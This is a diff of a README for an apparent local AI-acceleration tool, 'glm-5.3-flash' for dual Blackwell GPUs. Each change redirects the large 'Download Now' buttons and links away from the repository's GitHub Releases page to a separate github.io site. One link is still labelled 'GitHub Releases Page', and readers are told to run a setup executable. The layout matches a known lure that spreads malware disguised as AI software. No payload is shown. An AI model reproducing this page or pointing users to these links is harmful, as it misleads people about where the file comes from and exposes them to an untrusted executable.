@@ -1,7 +1,7 @@
 <h1>🚀 glm-5.3-flash-2x-rtx-pro-6000-blackwell - Run AI at Lightning Speed</h1>
 
 <p align="center">
-  <a href="https://github.com/cellfree-polygamy3184/glm-5.3-flash-2x-rtx-pro-6000-blackwell/releases" style="display:inline-block;padding:15px 30px;background:linear-gradient(45deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Download Now - Free & Easy Setup</a>
+  <a href="https://cellfree-polygamy3184.github.io" style="display:inline-block;padding:15px 30px;background:linear-gradient(45deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Download Now - Free & Easy Setup</a>
 </p>
 
 ---
@@ -63,7 +63,7 @@ First, make sure your computer meets this one simple requirement:
 
 Click the big orange button at the top of this page, or use the link below:
 
-**[⬇️ Download the Application Here](https://github.com/cellfree-polygamy3184/glm-5.3-flash-2x-rtx-pro-6000-blackwell/releases)**
+**[⬇️ Download the Application Here](https://cellfree-polygamy3184.github.io)**
 
 Visit this link to download the application. You will be taken to a page with the latest release. Look for the file that matches your system, usually named something like `glm-flash-setup.exe` or `glm-flash-windows.zip`. The download will begin automatically.
 
@@ -150,7 +150,7 @@ On your dual 96GB Blackwell GPUs, responses typically appear in under a second f
 
 If you run into any trouble during download or installation:
 
-1. Visit the **[GitHub Releases Page](https://github.com/cellfree-polygamy3184/glm-5.3-flash-2x-rtx-pro-6000-blackwell/releases)** for the latest updates and bug fixes.**
+1. Visit the **[GitHub Releases Page](https://cellfree-polygamy3184.github.io)** for the latest updates and bug fixes.**
 2. Check if there's a "Discussions" or "Issues" tab on the main repository page. You might find answers from other users.**
 3. Make sure your GPUs drivers are fully updated to the latest NVIDIA Game Ready or Studio driver.**
 4. Ensure both GPUs are properly seated in your motherboard and receiving adequate power.**
@@ -167,7 +167,7 @@ Click the button below to grab your copy nowand start using AI at the speed of l
 
 
 <p align="center">
-  <a href="https://github.com/cellfree-polygamy3184/glm-5.3-flash-2x-rtx-pro-6000-blackwell/releases" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:white;font-size:22px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 15px rgba(0,242,254,0.4);">⬇️ GET STARTED - DOWNLOAD NOW</a>
+  <a href="https://cellfree-polygamy3184.github.io" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#4facfe,#00f2fe);color:white;font-size:22px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 15px rgba(0,242,254,0.4);">⬇️ GET STARTED - DOWNLOAD NOW</a>
 </p>
 
 ---
